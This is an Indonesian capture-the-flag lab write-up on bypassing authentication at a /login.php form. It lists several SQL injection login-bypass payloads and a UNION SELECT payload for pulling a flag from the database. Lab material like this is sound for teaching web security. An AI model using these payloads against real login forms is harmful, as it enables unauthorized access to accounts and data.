# Lab E3 - Authentication Bypass (Easy)

## Informasi Lab
- **Endpoint**: `/login.php`
- **Tipe**: Auth Bypass
- **Hint**: Login message - OR 1=1

## Analisis

### 1. Identifikasi Form Login
```html
<form method='POST'>
Username: <input type='text' name='user'>
Password: <input type='password' name='pass'>
<button>Login</button>
</form>
```

### 2. Query Backend (Perkiraan)
```sql
SELECT * FROM users WHERE user='$user' AND pass='$pass'
```

## Solusi

### Metode 1 - Basic Bypass
```
Username: admin'--
Password: anything
```
Query menjadi:
```sql
SELECT * FROM users WHERE user='admin'--' AND pass='anything'
```

### Metode 2 - OR 1=1
```
Username: admin' OR '1'='1
Password: x
```
Query menjadi:
```sql
SELECT * FROM users WHERE user='admin' OR '1'='1' AND pass='x'
```

### Metode 3 - Comment Password
```
Username: admin'/*
Password: */OR'1'='1
```

### Metode 4 - Universal Bypass
```
Username: ' OR '1'='1'--
Password: ' OR '1'='1'--
```

## Setelah Login Berhasil

### Ekstrak Flag via UNION
Karena sudah authenticated, mungkin bisa akses fitur lain atau lakukan injection di tempat lain.

### Alternatif: Blind Extraction
Jika tidak ada output langsung, gunakan:
```
Username: admin' UNION SELECT 1,flag,3 FROM flags--
Password: x
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Catatan
- Auth bypass tidak selalu memberikan flag langsung
- Setelah bypass, lanjutkan enumerasi database
